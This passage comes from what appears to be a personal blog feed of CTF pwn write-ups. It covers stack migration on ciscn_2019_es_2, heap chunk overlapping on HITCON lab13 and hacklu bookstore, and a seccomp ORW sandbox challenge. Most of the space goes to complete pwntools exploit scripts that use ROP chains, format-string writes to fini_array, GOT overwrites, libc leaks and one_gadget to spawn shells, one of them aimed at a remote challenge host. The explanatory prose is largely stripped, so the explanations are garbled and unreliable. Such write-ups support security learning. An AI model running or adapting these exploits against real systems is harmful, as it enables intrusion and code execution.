80%;"><p>ebp&#x3D;0xff82fc88</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>ebp0xff82fc880xff82fc50&#x3D;0x38</p><p>readreadebpleave retmov espebp</p><p>pop ebpjunk</p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195704199.png" alt="image-20230312195704199" style="zoom:80%;"><p>retbin&#x2F;sh</p><p>payload2&#x3D;bjunk+p32(elf.symbols[system])+p32(0x123)+p32(ebp+0x10)+b&#x2F;bin&#x2F;sh<br>payload2&#x3D;payload2.ljust(0x28,b\x00)<br>payload2+&#x3D;p32(ebp)+p32(leave_ret)</p><p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195856603.png" alt="image-20230312195856603"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25443&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line">db(<span class="string">&#x27;b* 0x80485CD&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">sa(<span class="string">b&#x27;name?\n&#x27;</span>,padding)</span><br><span class="line">ru(padding)</span><br><span class="line">ebp=u32(io.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;junk&#x27;</span>+p32(elf.symbols[<span class="string">&#x27;system&#x27;</span>])+p32(<span class="number">0x123</span>)+p32(ebp+<span class="number">0x10</span>)+<span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(ebp)+p32(leave_ret)</span><br><span class="line">sl(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Stack Migration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunk Extend and Overlapping</title>
      <link href="/2023/03/10/Chunk-Extend-and-Overlapping/"/>
      <url>/2023/03/10/Chunk-Extend-and-Overlapping/</url>
      
        <content type="html"><![CDATA[<h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; checksec heapcreator</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/heapcreator&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>heaparraybssheap</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> size ;</span><br><span class="line">    <span class="type">char</span> *content ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>freecontent</p><p>editoff by one</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( heaparray[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(heaparray[v1]-&gt;content, heaparray[v1]-&gt;size + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>chunksize</p><p>create(0x18, bone)<br>create(0x10, btwo) </p><p>40x20chunkonechunktwopre_size</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311010202508.png" alt="image-20230311010202508"></p><p>onecontexttwosize</p><p>edit(0, &#x2F;bin&#x2F;sh\x00 + a * 0x10 + \x41)</p><p>41</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311010444200.png" alt="image-20230311010444200"></p><p>two  delete(1) overlapchunk</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311011034574.png" alt="image-20230311011034574"></p><p>create(0x30, p64(0) * 4 + p64(0x30) + p64(elf.got[free]))</p><p> *heap0x20chunkcontent0x40chunk0x40chunkoverlap0x20chunkcontentgotshow</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311012105213.png" alt="image-20230311012105213"></p><p>systemedit two,free gotsystemdelete onebinshshell</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311014939768.png" alt="image-20230311014939768"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./heapcreator&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    </span><br><span class="line">db(<span class="string">&#x27;b *0x00400A43&#x27;</span>)</span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">b&quot;one&quot;</span>) </span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&quot;two&quot;</span>) </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">b&quot;\x41&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))  <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line">free_ad =u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;free_addr&#x27;</span>,free_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_ad)</span><br><span class="line">base=free_ad-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; checksec books_e_o </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/books_e_o&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><ul><li>main</li><li>delete_orderuaf</li><li>edit_orderoverlap</li></ul><p>main0x80submit0x140</p><p>print(dest)</p><p>destsize0x150deletedestbinssubmitsubmit12dest</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">submit</span><span class="params">(<span class="type">char</span> *all, <span class="type">const</span> <span class="type">char</span> *order1, <span class="type">char</span> *order2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(all, <span class="string">&quot;Order 1: &quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(order1);</span><br><span class="line">  <span class="built_in">strncat</span>(all, order1, v3);</span><br><span class="line">  <span class="built_in">strcat</span>(all, <span class="string">&quot;\nOrder 2: &quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(order2);</span><br><span class="line">  <span class="built_in">strncat</span>(all, order2, v4);</span><br><span class="line">  *(_WORD *)&amp;all[<span class="built_in">strlen</span>(all)] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line"><span class="built_in">printf</span>(dest);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>ret fini_array hook</p><blockquote><p>fini_array hook</p><p><code>.init_array</code> <code>.fini_array</code></p><p><code>.init_array</code>main()mainhookc++</p><p><code>.fini_array</code>  main() c++</p><p><code>.init_array</code> array[0]-&gt;array[1]</p><p><code>.fini_array</code> array[1]-&gt;array[0]</p></blockquote><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172008247.png" alt="image-20230311172008247"></p><p></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172557368.png" alt="image-20230311172557368"></p><p>payload &#x3D; b%+str(2617).encode()+bc%13$hn + babc%51$p + bdef%26$p<br>payload +&#x3D; bA*(0x74-len(payload))<br>payload&#x3D;payload.ljust(0x88,b\x00)<br>payload +&#x3D; p64(0x151)</p><p>edit(1,payload)</p><p>size</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172648818.png" alt="image-20230311172648818"></p><p>payload%51__libc_start_main+128</p><blockquote><p>0x74</p><p>submit0x90dest</p><p>Order 1:<code>+</code>chunk1<code>+</code>\n<code>+</code>Order 2:<code>+</code>Order 1:  28</p><p>0x90-28&#x3D;0x74</p></blockquote><p></p><p>delete(2)</p><p>payload2 &#x3D; p8(0x0)*7 + p64(fini_array)<br>submit(payload2)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( s[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Enter first </span></span><br></pre></td></tr></table></figure><p>fgetsgdbfini_array13</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311175311347.png" alt="image-20230311175311347"></p><p>0x400830main 0x400A39payloadb%+str(2617).encode()+bc%13$hnmainmain retmain</p><p>pay%26$p</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311175610680.png" alt="image-20230311175610680"></p><p>hookmain</p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311180117794.png" alt="image-20230311180117794" style="zoom:67%;"><p><code>ret_bp=fixed-0x461-0x100</code></p><p>mainone_gadget</p><p>payload&#x3D;b%+str(one_gadget&amp;0xff).encode()+bc%13$hhn%+str(((one_gadget&gt;&gt;8)&amp;0xffff)-(one_gadget&amp;0xff)).encode()+bc%14$hn<br>print(payload)<br>payload +&#x3D; bA*(0x74-len(payload))<br>payload&#x3D;payload.ljust(0x88,b\x00)<br>payload +&#x3D; p64(0x151)<br>edit(1,payload)<br>delete(2)<br>payload&#x3D;p8(0x0)*7+p64(ret_bp)+p64(ret_bp+1)<br>submit(payload)</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311181810289.png" alt="image-20230311181810289"></p><p>shell</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311181846332.png" alt="image-20230311181846332"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./books_e_o&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">order, name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(order).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27; order:\n&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">order</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(order + <span class="number">2</span>).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span> + payload)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Order 1: &#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Order 2: Order 1: &#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># db(&#x27;b *0x400A91&#x27;)</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">2617</span>).encode()+<span class="string">b&quot;c%13$hn&quot;</span>  + <span class="string">b&#x27;abc%51$p&#x27;</span> + <span class="string">b&#x27;def%26$p&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload2 = p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(fini_array)</span><br><span class="line">submit(payload2)</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">__libc_start_main=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">128</span></span><br><span class="line">ru(<span class="string">b&#x27;def&#x27;</span>)</span><br><span class="line">fixed=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">p(<span class="string">&#x27;fixed&#x27;</span>,fixed)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">ret_bp=fixed-<span class="number">0x461</span>-<span class="number">0x100</span></span><br><span class="line">p(<span class="string">&#x27;ret_bp&#x27;</span>,ret_bp)</span><br><span class="line">one_gadget=<span class="number">0xebcf5</span>+base</span><br><span class="line">p(<span class="string">&#x27;one_gadget&#x27;</span>,one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xff</span>).encode()+<span class="string">b&#x27;c%13$hhn%&#x27;</span>+<span class="built_in">str</span>(((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>)-(one_gadget&amp;<span class="number">0xff</span>)).encode()+<span class="string">b&#x27;c%14$hn&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload=p8(<span class="number">0x0</span>)*<span class="number">7</span>+p64(ret_bp)+p64(ret_bp+<span class="number">1</span>)</span><br><span class="line">submit(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Chunk Extend And Overlapping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 PWN</title>
      <link href="/2023/03/05/sd-police2023-pwn/"/>
      <url>/2023/03/05/sd-police2023-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="SandBox"><a href="#SandBox" class="headerlink" title="SandBox"></a>SandBox</h1><p><a href="https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg">https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg</a><br>05zg</p><p></p><blockquote><p>(Sandbox)</p><p></p><ul><li><p>prctl</p></li><li><p>seccomp</p></li></ul></blockquote><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; checksec sandbox</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/police-pwn-2023/sandbox&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; seccomp-tools dump ./sandbox</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>execvesystemsystemglibcshell&#x3D;fork+exec+waitpid</p><img src="/2023/03/05/sd-police2023-pwn/image-20230305122657981.png" alt="image-20230305122657981" style="zoom:80%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  io(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;A bit small, but it doesn&#x27;t affect me cat flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>0x10</p><p>bss&#x3D;0x404500</p><ul><li><p>payload&#x3D;padding+p64(bss)+p64(read_ret)leave retrbpbssret read</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305154743044.png" alt="image-20230305154743044" style="zoom: 67%;"></li></ul></li><li><p>payload&#x3D;padding+p64(bss+0x50)+p64(read_ret)bss-0x50</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305155002168.png" alt="image-20230305155002168" style="zoom:80%;"></li></ul></li><li><p>rsp0x404510(leave mov esp,ebppop rbpretrsp0x10),rbp0x404550read</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305155441801.png" alt="image-20230305155441801" style="zoom:80%;"></li></ul></li><li><p>payload&#x3D;p64(bss+0x60)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)bsspayload</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305161933424.png" alt="image-20230305161933424"></li></ul></li><li><p>call read0x404508pop rdi retgotmain</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305231637179.png" alt="image-20230305231637179" style="zoom:67%;"></li></ul></li><li><p>mainread</p></li></ul><h2 id="ORWflag"><a href="#ORWflag" class="headerlink" title="ORWflag"></a>ORWflag</h2><p><strong>32<em></em></strong>int $0x80eaxebxecxedxeax</p><p>64 syscallraxrdirsirdxrax</p><p></p><ul><li><ul><li>syscall  edi  esi  edx  ecx</li><li>int 0x80  ebx  ecx  edx  esi  edi</li></ul></li></ul><p></p><ul><li>syscall C</li><li>int 0x80 </li></ul><p>.&#x2F;flagreadpayload&#x3D;bdeadbeef+p64(rdi)+p64(0)+p64(rsi_r15)+p64(0x404900)+p64(0x40)+p64(read_addr)+p64(main)</p><blockquote><p></p><p>0 </p><p>1  </p><p>2  </p></blockquote><p>syscallflagread</p><p>payload&#x3D;bdeadbeef+p64(rdi)+p64(0x2)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[syscall])<br>payload+&#x3D;p64(rdi)+p64(3)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[read])+p64(main)</p><blockquote><p>syscall</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306010914175.png" alt="image-20230306010914175"></p><p>rdi rsi rdxrax rdi  